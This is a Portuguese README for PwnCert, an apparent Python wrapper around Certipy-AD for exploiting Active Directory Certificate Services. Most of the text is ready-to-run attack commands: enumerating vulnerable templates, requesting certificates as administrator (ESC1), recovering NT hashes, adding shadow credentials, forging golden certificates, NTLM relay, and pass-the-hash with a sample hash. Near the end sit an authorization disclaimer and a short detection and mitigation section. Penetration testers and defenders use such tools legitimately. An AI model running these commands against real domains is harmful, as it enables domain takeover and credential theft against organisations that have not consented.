# PwnCert 🔐

<div align="center">

```
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║   ██████╗ ██╗    ██╗███╗   ██╗ ██████╗███████╗██████╗ ████████╗
║   ██╔══██╗██║    ██║████╗  ██║██╔════╝██╔════╝██╔══██╗╚══██╔══╝
║   ██████╔╝██║ █╗ ██║██╔██╗ ██║██║     █████╗  ██████╔╝   ██║   
║   ██╔═══╝ ██║███╗██║██║╚██╗██║██║     ██╔══╝  ██╔══██╗   ██║   
║   ██║     ╚███╔███╔╝██║ ╚████║╚██████╗███████╗██║  ██║   ██║   
║   ╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝ ╚═════╝╚══════╝╚═╝  ╚═╝   ╚═╝   
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝
```

**Active Directory Certificate Services Exploitation Automation**

[![Python Version](https://img.shields.io/badge/python-3.7+-blue.svg)](https://www.python.org/downloads/)
[![License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
[![Powered by](https://img.shields.io/badge/powered%20by-Certipy--AD-red.svg)](https://github.com/ly4k/Certipy)

</div>

---

## 📖 Descrição

**PwnCert** é uma ferramenta de automação Python projetada para simplificar e agilizar a exploração de vulnerabilidades em **Active Directory Certificate Services (AD CS)**. Construída como um wrapper inteligente do [Certipy-AD](https://github.com/ly4k/Certipy), a PwnCert oferece uma interface de linha de comando amigável e workflows automatizados para profissionais de segurança ofensiva.

### 🎯 Por que PwnCert?

- **Automação Completa**: Execute múltiplos comandos Certipy-AD em workflows automatizados
- **Interface Simplificada**: CLI intuitiva com subcomandos organizados
- **Suporte Total ESC1-ESC16**: Cobertura completa de todas as técnicas de exploração AD CS conhecidas
- **Workflows Inteligentes**: Automatize processos complexos de enumeração até privilégio escalado
- **Flexibilidade**: Suporta múltiplos métodos de autenticação (senha, NTLM hashes)

---

## ✨ Funcionalidades

- 🔍 **Enumeração**: Descubra CAs, templates vulneráveis e configurações incorretas
- 🎫 **Requisição de Certificados**: Explore ESC1, ESC2, ESC3 e outras técnicas
- 🔐 **Autenticação**: Use certificados para obter TGTs e hashes NT
- 👤 **Shadow Credentials**: Ataque de persistência via Key Trust
- 🏆 **Golden Certificates**: Forge certificados com privilégios de CA
- 🔄 **NTLM Relay**: Relay para endpoints AD CS HTTP/RPC
- 📜 **Manipulação de Certificados**: Export, import e conversão de formatos
- ⚡ **Workflow Automatizado**: Execução completa do processo de exploração

---

## 🚀 Instalação

### Requisitos

- Python 3.7+
- pip
- Certipy-AD

### Instalação Rápida

```bash
# Clone o repositório
git clone https://github.com/yourusername/pwncert.git
cd pwncert

# Instale o Certipy-AD
pip install certipy-ad

# Torne o script executável
chmod +x pwncert.py

# Execute
python pwncert.py -h
```

### Instalação via pip (Opcional)

```bash
pip install -r requirements.txt
```

---

## 📚 Uso

### Sintaxe Básica

```bash
python pwncert.py [GLOBAL_OPTIONS] <COMMAND> [COMMAND_OPTIONS]
```

### Opções Globais

```
-u, --username      Username para autenticação
-p, --password      Password para autenticação
-H, --hashes        NTLM hashes (formato LM:NT)
-d, --domain        Domain name
--dc-ip             IP do Domain Controller
--debug             Modo debug (verbose)
```

---

## 💡 Exemplos de Uso

### 1. Enumeração de Templates Vulneráveis

```bash
# Enumerar todos os templates vulneráveis e habilitados
python pwncert.py -u 'user' -p 'Password123' -d 'corp.local' find --vulnerable --enabled

# Salvar resultado em JSON
python pwncert.py -u 'user' -p 'Password123' -d 'corp.local' find -v -e --json -o results
```

### 2. Exploração ESC1 - Requisitar Certificado com UPN Alternativo

```bash
# Requisitar certificado especificando UPN alternativo
python pwncert.py -u 'user' -p 'Password123' -d 'corp.local' \
  req -ca 'CORP-DC-CA' -t 'VulnerableTemplate' -a 'administrator@corp.local'
```

### 3. Autenticação com Certificado

```bash
# Autenticar usando certificado obtido e recuperar hash NT
python pwncert.py -u 'user' -p 'Password123' -d 'corp.local' \
  auth --pfx administrator.pfx

# Gerar ticket Kerberos (formato .kirbi)
python pwncert.py -u 'user' -p 'Password123' -d 'corp.local' \
  auth --pfx administrator.pfx --kirbi
```

### 4. Shadow Credentials Attack

```bash
# Adicionar Shadow Credential em conta alvo
python pwncert.py -u 'admin' -p 'Password123' -d 'corp.local' \
  shadow -a 'targetuser' --action add

# Listar Shadow Credentials existentes
python pwncert.py -u 'admin' -p 'Password123' -d 'corp.local' \
  shadow -a 'targetuser' --action list
```

### 5. Golden Certificate (Forge)

```bash
# Forjar certificado como Domain Admin
python pwncert.py -u 'admin' -p 'Password123' -d 'corp.local' \
  forge --ca-pfx ca.pfx --upn 'administrator@corp.local' -o forged
```

### 6. NTLM Relay para AD CS

```bash
# Iniciar relay para endpoint AD CS
python pwncert.py -u 'user' -p 'Password123' -d 'corp.local' \
  relay -ca 'CORP-DC-CA' -t 'User' --target 'http://ca.corp.local'
```

### 7. Workflow Automatizado Completo

```bash
# Executar workflow completo de exploração
python pwncert.py -u 'admin' -p 'Password123' -d 'corp.local' \
  workflow --target administrator -o ./results
```

### 8. Usando NTLM Hashes

```bash
# Autenticação com Pass-the-Hash
python pwncert.py -u 'admin' \
  -H 'aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c' \
  -d 'corp.local' find --vulnerable
```

---

## 🔧 Comandos Disponíveis

| Comando | Descrição |
|---------|-----------|
| `find` | Enumerar CAs, templates e identificar vulnerabilidades |
| `req` | Requisitar certificado de template vulnerável |
| `auth` | Autenticar usando certificado PFX |
| `shadow` | Executar Shadow Credentials attack |
| `forge` | Forjar certificado (Golden Certificate) |
| `relay` | Relay NTLM para AD CS endpoints |
| `cert` | Manipular certificados (export/import/convert) |
| `workflow` | Workflow automatizado completo |

---

## 🎓 Técnicas de Exploração Suportadas

PwnCert suporta todas as técnicas ESC (Escalation) conhecidas:

- **ESC1**: Misconfigured Certificate Templates
- **ESC2**: Misconfigured Certificate Templates (Any Purpose)
- **ESC3**: Enrollment Agent Templates
- **ESC4**: Vulnerable Certificate Template Access Control
- **ESC5**: Vulnerable PKI Object Access Control
- **ESC6**: EDITF_ATTRIBUTESUBJECTALTNAME2
- **ESC7**: Vulnerable Certificate Authority Access Control
- **ESC8**: NTLM Relay to AD CS HTTP Endpoints
- **ESC9-ESC16**: Técnicas avançadas de exploração

Para mais detalhes sobre cada técnica, consulte o [Certipy Wiki](https://github.com/ly4k/Certipy/wiki).

---

## 📁 Estrutura de Saída

Quando você executa comandos com output, PwnCert organiza os resultados:

```
results/
├── enumeration.json          # Resultados da enumeração
├── enumeration.txt           # Resultados em texto
├── administrator.pfx         # Certificados obtidos
├── administrator.key         # Chaves privadas
└── administrator_hash.txt    # Hashes NT recuperados
```

---

## ⚠️ Avisos Importantes

### Uso Ético e Legal

**PwnCert é uma ferramenta para uso em ambientes autorizados apenas.**

- ✅ Use em ambientes de teste/lab próprios
- ✅ Use em pentests com autorização explícita por escrito
- ✅ Use para pesquisa de segurança ética
- ❌ **NUNCA** use em sistemas sem autorização
- ❌ Uso não autorizado pode ser **ILEGAL** e resultar em consequências criminais

### Responsabilidade

O autor não se responsabiliza por uso indevido desta ferramenta. O usuário é totalmente responsável por garantir que possui autorização adequada antes de executar qualquer teste de segurança.

---

## 🛡️ Detecção e Defesa

### Detectando Exploração AD CS

- Monitor de eventos do Windows (Event IDs: 4886, 4887, 4888)
- Análise de requisições de certificados anômalas
- Auditoria de templates com configurações perigosas
- Implementação de PKINIT monitoring

### Mitigações

1. **Remover direitos de enrollment**: Limitar quem pode requisitar certificados
2. **Manager approval**: Exigir aprovação manual para templates sensíveis
3. **Remover SANs perigosos**: Desabilitar Subject Alternative Names em templates
4. **Auditar regularmente**: Usar `certipy find` para identificar misconfigurations
5. **Implementar EPA**: Extended Protection for Authentication

Para guia completo de hardening, veja: [AD CS Hardening Guide](https://github.com/ly4k/Certipy/wiki/10-%E2%80%90-Hardening)

---

## 🤝 Contribuindo

Contribuições são bem-vindas! Para contribuir:

1. Fork o projeto
2. Crie uma branch para sua feature (`git checkout -b feature/AmazingFeature`)
3. Commit suas mudanças (`git commit -m 'Add some AmazingFeature'`)
4. Push para a branch (`git push origin feature/AmazingFeature`)
5. Abra um Pull Request

---

## 📝 Roadmap

- [ ] Suporte a múltiplos domínios em um único workflow
- [ ] Modo de detecção (blue team)
- [ ] Relatórios HTML interativos
- [ ] Integração com outras ferramentas (Impacket, BloodHound)
- [ ] GUI opcional
- [ ] Export para formatos de pentest (Markdown, PDF)

---

## 🙏 Créditos

- **Certipy-AD**: [@ly4k](https://github.com/ly4k) - Ferramenta base excepcional
- **SpecterOps**: Research original sobre AD CS attacks
- **Will Schroeder & Lee Christensen**: Pesquisa fundamental sobre AD CS

---

## 📄 Licença

Este projeto está licenciado sob a licença MIT - veja o arquivo [LICENSE](LICENSE) para detalhes.

---

## 📞 Contato

- **Issues**: [GitHub Issues](https://github.com/yourusername/pwncert/issues)
- **Discussões**: [GitHub Discussions](https://github.com/yourusername/pwncert/discussions)

---

## ⭐ Apoie o Projeto

Se o PwnCert foi útil para você, considere:

- ⭐ Dar uma estrela no repositório
- 🐛 Reportar bugs e sugerir melhorias
- 📢 Compartilhar com a comunidade de segurança
- 🤝 Contribuir com código

---

<div align="center">

**Feito com ❤️ para a comunidade de Offensive Security**

*Use responsavelmente. Hack the planet (legally)!* 🌍🔓

</div>